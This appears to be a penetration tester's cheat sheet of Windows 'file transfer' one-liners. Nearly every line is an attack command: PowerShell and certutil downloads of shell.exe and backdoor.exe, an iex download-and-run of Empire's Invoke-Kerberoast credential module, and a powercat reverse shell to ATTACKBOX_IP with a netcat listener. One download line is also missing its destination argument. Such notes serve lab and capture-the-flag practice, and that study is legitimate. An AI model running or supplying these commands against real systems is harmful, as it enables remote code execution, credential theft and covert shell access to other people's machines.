# File transfers

(New-Object System.Net.WebClient).Downloadfile('http://10.10.164.52:1234/shell.exe')
# invoke expression cmdlet version
iex(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1')

Invoke-WebRequest -Uri http://10.10.10.10 -OutFile file.exe

certutil -urlcache -split -f http://10.x.x.x/backdoor.exe

# HARDCORE GUI way:
# Add ip to trusted sites and download

# http.server 8888 with powercat
# https://github.com/besimorhino/powercat.git
# nc -lvnp 1337
powershell -c "IEX(New-Object System.Net.WebClient).DownloadString('http://ATTACKBOX_IP:8080/powercat.ps1');powercat -c ATTACKBOX_IP -p 1337 -e cmd"

# One line NC web server
# http://blog.lukesampson.com/run-a-web-server-in-one-line-of-powershell
# added .exe because he uses scoop
# REQUIRES NETCAT
while(1) { cat index.html | nc.exe -w1 -l -p 8080 }

